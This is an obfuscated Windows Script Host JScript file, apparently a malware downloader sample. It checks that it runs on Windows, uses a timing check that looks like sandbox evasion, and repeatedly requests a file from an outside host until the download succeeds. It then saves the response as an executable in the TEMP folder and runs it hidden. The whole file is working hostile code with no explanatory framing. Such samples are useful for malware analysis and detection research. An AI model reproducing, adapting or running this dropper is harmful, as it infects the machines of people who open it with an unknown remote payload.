var i = false;
var R = "CreateObject";
var dj = function L() {return WScript[R]("WScript.Shell");}(), b = 11;
var YL = "MSXML2.XMLHTTP";
var O = 2123213;
var X = 0;
function lY(WW){dj["Run"](WW, X, X);};
function Ms(){return "" + YL;};
function M(vK, k){X = X * 1; return vK - k;};
function lq(){return R;};
/*@cc_on
  @if (@_win32 || @_win64)
    i = true;
  @end
@*/
if (i)
{
var c = "";
function vS(){return 22;};
var U = 0; var Gg = 0;
function D0()
{
var C = new this["Date"]();
var Q = C["getUTCMilliseconds"]();
WScript["Sleep"](vS());
var C = new this["Date"]();
var z = C["getUTCMilliseconds"]();
WScript["Sleep"](vS());
var C = new this["Date"]();
var Y = C["getUTCMilliseconds"]();
var U = "qK";
U = M(z, Q);
var Gg = "dB";
Gg = M(Y, z);
c = "open";
return M(U, Gg);
}
var NA = false;
var uF = false;
for (var G = X; G < vS() * 1; G++){if (D0() != X){
NA = true; 
Gg = "31" + 11 * U + Gg; 
uF = true; 
break;
}}
function gY() {return ((NA == true) && (NA == uF)) ? 1 : X;};
if (NA && gY() && uF){
function E() {return dj["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ug1o6SRSZ3z8mAYX.exe";};
 yt = Ms();
 Qu = WScript[R](yt);
 var kC = 1;
 while (kC){
try {
Qu[c]("GET", "http://digimacro.com.br/m8isda", false);
Qu["send"]();
M0 = "Sleep";
for (;;){WScript[M0](vS() * 11); if (Qu["readystate"] >= 2 * 2) break;};
kC = X;
} catch(gT){};
}
function D(ut) {var ia = (1, 2, 3, 4, 5, ut); return ia;};
cL = WScript[lq()]("ADODB.Stream");
yt = cL;
yt[c]();
yt["type"] = D(1);
yt["write"](Qu["ResponseBody"]);
cL["position"] = D(X);
yt["Save" + "ToFile"](E(), 2);
cL["c"+"lose"]();
V = E();
lY(V);
}
}

